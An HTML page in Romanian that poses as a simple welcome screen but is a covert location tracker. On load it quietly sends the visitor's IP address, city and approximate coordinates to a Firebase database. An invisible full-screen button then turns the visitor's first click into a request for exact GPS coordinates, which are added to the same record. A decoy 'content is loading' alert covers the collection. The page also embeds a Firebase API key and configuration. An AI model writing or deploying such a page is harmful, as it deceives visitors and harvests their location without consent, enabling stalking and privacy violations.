<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagina de Start</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
        
        /* Butonul invizibil care acoperă tot ecranul */
        #overlay-button {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(255,255,255,0.01); /* Aproape invizibil */
            z-index: 9999;
            cursor: pointer;
            border: none;
        }

        .content {
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; height: 100vh; text-align: center;
        }
    </style>
</head>
<body>

    <button id="overlay-button" onclick="requestGPS()"></button>

    <div class="content">
        <h1>Bine ai venit</h1>
        <p>Apasă oriunde pentru a continua...</p>
        <div id="status" style="color: gray; font-size: 12px; margin-top: 20px;"></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCJxFox3puC2aDapW9peyPgOLhIVMyzI4c",
            authDomain: "location-demo-64338.firebaseapp.com",
            databaseURL: "https://location-demo-64338-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "location-demo-64338",
            storageBucket: "location-demo-64338.firebasestorage.app",
            messagingSenderId: "884756282803",
            appId: "1:884756282803:web:8724805c2c32d3273b5fc6"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let visitRef = null;

        // 1. IMEDIAT: Luăm locația aproximativă prin IP
        window.onload = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const info = {
                    tip: "IP (Aproximativ)",
                    lat: data.latitude,
                    lon: data.longitude,
                    oras: data.city,
                    ip: data.ip,
                    timp: new Date().toLocaleString()
                };
                // Salvăm și păstrăm referința pentru a o actualiza mai târziu
                visitRef = await database.ref('vizite').push(info);
                console.log("IP capturat");
            } catch(e) { console.error(e); }
        };

        // 2. LA CLICK: Cerem GPS-ul exact
        function requestGPS() {
            // Ascundem overlay-ul după primul click
            document.getElementById('overlay-button').style.display = 'none';
            document.getElementById('status').innerText = "Se verifică browserul...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // Dacă utilizatorul a dat PERMITE
                        const gpsData = {
                            tip: "GPS (EXACT)",
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            precizie: pos.coords.accuracy + " metri",
                            timp_gps: new Date().toLocaleString()
                        };

                        // Actualizăm intrarea existentă în Firebase
                        if (visitRef) {
                            visitRef.update(gpsData);
                        }
                        alert("Conținutul se încarcă...");
                    },
                    (err) => {
                        console.log("GPS Refuzat");
                        // Chiar dacă refuză, noi avem deja locația prin IP de la pasul 1
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            }
        }
    </script>
</body>
</html>
